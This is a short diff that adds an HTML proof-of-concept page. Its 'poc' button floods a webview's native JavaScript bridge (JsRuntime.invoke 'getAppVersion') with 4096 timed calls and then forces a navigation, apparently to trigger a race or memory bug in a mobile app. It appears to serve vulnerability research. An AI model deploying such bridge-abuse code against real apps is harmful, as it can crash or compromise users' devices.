@@ -1,0 +1,16 @@
+<button style="width:200px;height:200px;font-size: 30px;" onclick="poc()">poc</button><br />
+<button style="width:200px;height:200px;font-size: 30px;" onclick="location.href=location.href">F5</button>
+
+<script>
+    function getAppVersion(msg) {
+        const callbackId = `dev_${Date.now()}`;
+        window.JsRuntime.invoke('getAppVersion', '{}', callbackId);
+    }
+
+    function poc() {
+        for (var i = 0; i < 0x1000; i++) {
+            setTimeout(getAppVersion, i)
+        }
+        document.location.href = "http://baidu.com?url=http://pov.woa.com";
+    }
+</script>
